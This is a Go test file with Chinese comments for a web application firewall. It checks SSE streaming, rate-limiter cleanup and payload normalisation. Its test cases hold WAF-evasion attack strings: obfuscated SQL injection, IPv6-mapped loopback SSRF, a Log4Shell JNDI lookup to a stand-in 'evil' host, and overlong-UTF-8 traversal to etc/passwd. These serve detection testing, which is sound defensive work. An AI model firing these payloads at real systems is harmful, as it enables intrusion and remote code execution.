package waf

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"
)

// TestStatusRecorderPreservesInterfaces AUDIT N1：
// 包装器必须能被 ResponseController 解包，并透传 Flush，
// 否则 SSE 失去实时性、WebSocket 升级因取不到 Hijacker 而 502。
func TestStatusRecorderPreservesInterfaces(t *testing.T) {
	sr := httptest.NewRecorder()
	rec := &statusRecorder{ResponseWriter: sr, status: http.StatusOK}

	if rec.Unwrap() != http.ResponseWriter(sr) {
		t.Fatal("Unwrap 未返回底层 ResponseWriter，ResponseController 无法解包")
	}
	if _, ok := interface{}(rec).(http.Flusher); !ok {
		t.Fatal("statusRecorder 未实现 http.Flusher")
	}
	rec.Flush()
	if !sr.Flushed {
		t.Fatal("Flush 未透传到底层 ResponseWriter")
	}
}

// TestProxyStreamsSSE AUDIT N1 端到端：开启 LogAllows 后，
// SSE 首段必须实时到达（不修时会被缓冲到最后）。
func TestProxyStreamsSSE(t *testing.T) {
	const firstDelay = 200 * time.Millisecond
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fl, ok := w.(http.Flusher)
		if !ok {
			t.Error("上游不支持 Flush")
			return
		}
		w.Header().Set("Content-Type", "text/event-stream")
		_, _ = w.Write([]byte("data: first\n\n"))
		fl.Flush()
		time.Sleep(firstDelay)
		_, _ = w.Write([]byte("data: second\n\n"))
		fl.Flush()
	}))
	defer upstream.Close()

	u, _ := url.Parse(upstream.URL)
	audit, _ := NewAudit("")
	p, err := NewProxy(Config{Upstream: u, Engine: NewEngine(nil), Audit: audit, LogAllows: true})
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(p.Handler())
	defer srv.Close()

	start := time.Now()
	resp, err := http.Get(srv.URL + "/stream")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()

	buf := make([]byte, 64)
	if _, err := resp.Body.Read(buf); err != nil {
		t.Fatalf("读取首段失败: %v", err)
	}
	elapsed := time.Since(start)
	if elapsed >= firstDelay {
		t.Fatalf("首段耗时 %v，说明响应被包装器缓冲了（应 < %v）", elapsed, firstDelay)
	}
}

// TestRateLimiterCleanupOnRealPath AUDIT N3：
// 覆盖 allow() 内部的真实清理触发路径（count>阈值 且 距上次清理超过间隔）。
func TestRateLimiterCleanupOnRealPath(t *testing.T) {
	l := newRateLimiter(1000, 2*time.Millisecond)
	for i := 0; i < cleanupThreshold+10; i++ {
		l.allow(fmt.Sprintf("10.2.%d.%d", i/256, i%256))
	}
	if l.size() < cleanupThreshold {
		t.Fatalf("未灌满限流器: %d", l.size())
	}
	// 让所有窗口过期，并把 lastSweep 拨到过去，使下一次 allow 触发清理
	time.Sleep(10 * time.Millisecond)
	l.mu.Lock()
	l.lastSweep = time.Now().Add(-2 * time.Second)
	l.mu.Unlock()

	l.allow("10.99.99.99")
	if got := l.size(); got > 2 {
		t.Fatalf("触发清理后仍剩 %d 个 IP，惰性清理未生效", got)
	}
}

// TestR4GapsClosed AUDIT 剩余 6 条缺口修复验证（%c0%af 之外的五条 + 超长编码）。
func TestR4GapsClosed(t *testing.T) {
	e := NewEngine(nil)
	cases := []struct {
		name string
		req  *Request
	}{
		{"关键字中间插注释", &Request{Query: "id=1 un/**/ion se/**/lect 1"}},
		{"MySQL 版本注释", &Request{Query: "id=1 /*!50000union*/ select 1"}},
		{"括号包裹恒真式", &Request{Query: "id=1 and (1)=(1)"}},
		{"IPv6 映射回环", &Request{Query: "url=http%3A%2F%2F%5B%3A%3Affff%3A127.0.0.1%5D%3A8080%2F"}},
		{"JNDI env 前缀绕过", &Request{Query: "${${env:FOO:-j}ndi:ldap://evil/a}"}},
		{"超长 UTF-8 斜杠", &Request{Query: "f=..%c0%af..%c0%afetc%c0%afpasswd"}},
	}
	for _, c := range cases {
		if m := e.Inspect(c.req); m == nil {
			t.Errorf("[%s] 仍未拦截", c.name)
		}
	}
}

// TestCommentSquashVariants 两种注释手法都必须能还原：
// UNION/**/SELECT 靠"替换为空格"，un/**/ion 靠"删除后拼接"。
func TestCommentSquashVariants(t *testing.T) {
	withSpace := Normalize("UNION/**/SELECT")
	if !strings.Contains(withSpace, "UNION SELECT") {
		t.Fatalf("保空格版未还原: %q", withSpace)
	}
	if got := normalize("un/**/ion", true, true); got != "union" {
		t.Fatalf("删注释版未拼回 union: %q", got)
	}
}

// TestMySQLVersionCommentKept MySQL 可执行注释里的语句必须保留（不是整段删掉）。
func TestMySQLVersionCommentKept(t *testing.T) {
	got := Normalize("id=1 /*!50000union*/ select 1")
	if !strings.Contains(got, "union") {
		t.Fatalf("版本注释内容被丢弃: %q", got)
	}
}

// TestEnvDefaultExpanded ${env:X:-y} 取默认值，外层 ${...} 保留。
func TestEnvDefaultExpanded(t *testing.T) {
	got := Normalize("${${env:FOO:-j}ndi:ldap://evil/a}")
	if !strings.Contains(got, "jndi:ldap") {
		t.Fatalf("env 默认值未展开: %q", got)
	}
}

// TestHexEscapeNotDecoded AUDIT N2：
// 正文里讨论 `\x3c` 转义写法不应被归一成 < 从而误拦；\u003c 仍需解码。
func TestHexEscapeNotDecoded(t *testing.T) {
	e := NewEngine(nil)
	if m := e.Inspect(&Request{Body: `本文说明 \x3cscript\x3e 是标签的十六进制转义写法`}); m != nil {
		t.Fatalf("正文讨论十六进制转义被误拦: rule=%s", m.RuleID)
	}
	if got := Normalize(`\u003cscript\u003e`); !strings.Contains(got, "<script>") {
		t.Fatalf("\\u 转义未解码: %q", got)
	}
}

// TestEscapedEntityChained \u0026lt; 这类"转义解出实体"的组合要能继续解成 <。
func TestEscapedEntityChained(t *testing.T) {
	got := Normalize(`\u0026lt;script\u0026gt;`)
	if !strings.Contains(got, "<script>") {
		t.Fatalf("转义+实体组合未解到底: %q", got)
	}
}

// TestIPv6MappedOnlyIPv4StaysPure 纯 IPv6（[::1]）不应被误改成 IPv4。
func TestIPv6MappedOnlyIPv4StaysPure(t *testing.T) {
	got := Normalize("http://[::1]:8080/")
	if !strings.Contains(got, "[::1]") {
		t.Fatalf("纯 IPv6 地址被破坏: %q", got)
	}
}
